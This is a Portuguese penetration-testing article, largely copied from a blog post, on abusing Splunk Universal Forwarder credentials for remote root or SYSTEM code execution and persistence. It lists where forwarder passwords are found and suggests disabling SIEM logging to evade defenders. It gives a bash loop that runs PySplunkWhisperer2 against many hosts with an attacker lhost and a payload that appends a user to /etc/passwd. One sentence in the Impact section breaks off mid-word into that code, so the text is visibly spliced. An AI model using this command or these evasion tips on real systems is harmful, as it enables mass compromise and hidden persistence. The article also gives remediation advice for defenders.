Se você está fazendo uma enumeração interna ou externa de uma máquina e encontra o Splunk em execução (porta 8090), se você tiver sorte e souber de quaisquer credenciais válidas, poderá abusar do serviço Splunk para executar um shell como o usuário que está executando o Splunk. Se o root estiver executando, você pode elevar os privilégios para root.

Além disso, se você já é root e o serviço Splunk não está ouvindo apenas em localhost, você pode roubar o arquivo de senha do serviço Splunk e quebrar as senhas ou adicionar novas credenciais a ele. E manter a persistência no host.

Na primeira imagem abaixo, você pode ver como se parece uma página da web do Splunkd.

As seguintes informações foram copiadas de https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/

# Abusando dos Splunk Forwarders para shells e persistência

14 de agosto de 2020

## Descrição:

O agente Splunk Universal Forwarder (UF) permite que usuários remotos autenticados enviem comandos ou scripts únicos para os agentes por meio da API Splunk. O agente UF não valida as conexões que estão vindo de um servidor Splunk Enterprise válido, nem valida o código que está assinado ou comprovado de outra forma para ser do servidor Splunk Enterprise. Isso permite que um invasor que obtenha acesso à senha do agente UF execute código arbitrário no servidor como SYSTEM ou root, dependendo do sistema operacional.

Este ataque está sendo usado por testadores de penetração e provavelmente está sendo ativamente explorado na natureza por atacantes mal-intencionados. Obter a senha pode levar à comprometimento de centenas de sistemas em um ambiente do cliente.

As senhas do Splunk UF são relativamente fáceis de adquirir, consulte a seção Locais comuns de senha para obter detalhes.

## Contexto:

O Splunk é uma ferramenta de agregação e pesquisa de dados frequentemente usada como um sistema de monitoramento de informações e eventos de segurança (SIEM). O Splunk Enterprise Server é um aplicativo da web que é executado em um servidor, com agentes, chamados de Universal Forwarders, que são instalados em cada sistema na rede. O Splunk fornece binários de agente para Windows, Linux, Mac e Unix. Muitas organizações usam o Syslog para enviar dados para o Splunk em vez de instalar um agente em hosts Linux / Unix, mas a instalação do agente está se tornando cada vez mais popular.

O Universal Forwarder é acessível em cada host em https://host:8089. O acesso a qualquer uma das chamadas de API protegidas, como /service/, exibe uma caixa de autenticação básica. O nome de usuário é sempre admin e a senha padrão costumava ser changeme até 2016, quando o Splunk exigiu que todas as novas instalações definissem uma senha de 8 caracteres ou mais. Como você notará em minha demonstração, a complexidade não é um requisito, pois a senha do meu agente é 12345678. Um atacante remoto pode forçar a senha sem bloqueio, o que é uma necessidade de um host de log, pois se a conta for bloqueada, os logs não seriam mais enviados para o servidor Splunk e um atacante poderia usar isso para ocultar seus ataques. A seguinte captura de tela mostra o agente Universal Forwarder, esta página inicial é acessível sem autenticação e pode ser usada para enumerar hosts que executam o Universal Forwarder do Splunk.

![0](https://eapolsniper.github.io/assets/2020AUG14/11_SplunkAgent.png)

A documentação do Splunk mostra o uso da mesma senha de encaminhamento universal para todos os agentes, não me lembro com certeza se isso é um requisito ou se senhas individuais podem ser definidas para cada agente, mas com base na documentação e na memória de quando eu era um administrador do Splunk, acredito que todos os agentes devem usar a mesma senha. Isso significa que, se a senha for encontrada ou quebrada em um sistema, é provável que funcione em todos os hosts do Splunk UF. Essa foi minha experiência pessoal, permitindo a comprometimento de centenas de hosts rapidamente.

## Locais comuns de senha

Com frequência, encontro a senha de texto simples do agente de encaminhamento universal do Splunk nos seguintes locais em redes:

1. Diretório Scripts do Sysvol / domain.com / do Active Directory. Os administradores armazenam o executável e a senha juntos para uma instalação eficiente do agente.
2. Compartilhamentos de arquivos de rede que hospedam arquivos de instalação de TI
3. Wiki ou outros repositórios de notas de compilação na rede interna

A senha também pode ser acessada em forma de hash em Program Files \ Splunk \ etc \ passwd em hosts Windows e em / opt / Splunk / etc / passwd em hosts Linux e Unix. Um invasor pode tentar quebrar a senha usando o Hashcat ou alugar um ambiente de quebra de nuvem para aumentar a probabilidade de quebrar o hash. A senha é um hash SHA-256 forte e, como tal, é improvável que uma senha forte e aleatória seja quebrada.

## Impacto:

Um invasor com uma senha do agente de encaminhamento universal do Splunk pode comprometer totalmente todos os hosts do Splunk na rede e obter permissões de nível SYSTEM ou root em cada host. Eu usei com sucesso o agente Splunk em hosts Windows, Linux e Solaris Unix. Essa vulnerabilidade pode permitir que as credenciais do sistema sejam despejadas, que dados confidenciais sejam exfiltrados ou que ransomware seja instalado. Essa vulnerabilidade é rápida, fácil de usar e confiável.

Como o Splunk lida com logs, um invasor pode reconfigurar o encaminhamento universal na primeira execução de comando para alterar a localização do encaminhamento, desativando o registro no SIEM Splunk. Isso reduziria drasticamente as chances de ser pego pela equipe Blue do cliente.

O Universal Forwarder do Splunk é frequentemente visto instalado em controladores de domínio para coleta de log, o que poderia permitir facilmente que um invasor extraísse o arquivo NTDS, desativasse o antivírus para uma exploração ad
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
Informações do host:

Servidor Splunk Enterprise: 192.168.42.114\
Vítima do agente Splunk Forwarder: 192.168.42.98\
Atacante: 192.168.42.51

Versão do Splunk Enterprise: 8.0.5 (a mais recente em 12 de agosto de 2020 - dia da configuração do laboratório)\
Versão do Universal Forwarder: 8.0.5 (a mais recente em 12 de agosto de 2020 - dia da configuração do laboratório)

### Recomendações de remediação para a Splunk, Inc: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

Recomendo a implementação de todas as seguintes soluções para fornecer defesa em profundidade:

1. Idealmente, o agente Universal Forwarder não teria uma porta aberta, mas sim consultaria o servidor Splunk em intervalos regulares para obter instruções.
2. Ative a autenticação mútua TLS entre os clientes e o servidor, usando chaves individuais para cada cliente. Isso forneceria segurança bidirecional muito alta entre todos os serviços Splunk. A autenticação mútua TLS está sendo amplamente implementada em agentes e dispositivos IoT, este é o futuro da comunicação confiável do cliente do dispositivo com o servidor.
3. Envie todo o código, arquivos de script ou de uma única linha em um arquivo compactado que esteja criptografado e assinado pelo servidor Splunk. Isso não protege os dados do agente enviados por meio da API, mas protege contra a execução remota de código malicioso de terceiros.

### Recomendações de remediação para clientes da Splunk: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Certifique-se de que uma senha muito forte seja definida para os agentes Splunk. Recomendo pelo menos uma senha aleatória de 15 caracteres, mas como essas senhas nunca são digitadas, isso pode ser definido como uma senha muito grande, como 50 caracteres.
2. Configure firewalls baseados em host para permitir apenas conexões com a porta 8089/TCP (porta do agente Universal Forwarder) do servidor Splunk.

## Recomendações para Red Team: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. Baixe uma cópia do Splunk Universal Forwarder para cada sistema operacional, pois é um ótimo implante leve e assinado. É bom manter uma cópia caso a Splunk realmente corrija isso.

## Explorações/Blogs de outros pesquisadores <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

Explorações públicas utilizáveis:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

Postagens de blog relacionadas:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_**Nota:**_ Este problema é um problema sério com sistemas Splunk e tem sido explorado por outros testadores há anos. Embora a execução remota de código seja um recurso pretendido do Splunk Universal Forwarder, a implementação disso é perigosa. Tentei enviar esse bug por meio do programa de recompensa por bugs da Splunk na muito improvável chance de que eles não estejam cientes das implicações de design, mas fui notificado de que todas as submissões de bugs implementam a política de divulgação Bug Crowd/Splunk que afirma que nenhum detalhe da vulnerabilidade pode ser discutido publicamente _nunca_ sem a permissão da Splunk. Solicitei um prazo de divulgação de 90 dias e fui negado. Como tal, não divulguei isso de forma responsável, já que estou razoavelmente certo de que a Splunk está ciente do problema e optou por ignorá-lo, sinto que isso poderia afetar gravemente as empresas e é responsabilidade da comunidade de segurança da informação educar as empresas.
